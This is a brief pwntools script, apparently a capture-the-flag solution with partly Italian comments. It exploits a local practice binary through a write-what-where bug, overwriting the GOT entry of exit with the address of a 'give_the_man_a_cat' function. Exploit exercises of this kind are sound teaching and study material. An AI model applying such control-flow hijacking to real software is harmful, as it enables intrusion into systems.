from pwn import *

e = ELF('./NeedsToBeHappy')
p = process('./NeedsToBeHappy')

p.sendline(b'Y') #il programma all'inizion chiede Y per continuare
p.sendline(str(e.symbols["give_the_man_a_cat"]).encode("ascii")) #what
p.sendline(str(e.got["exit"]).encode("ascii")) #where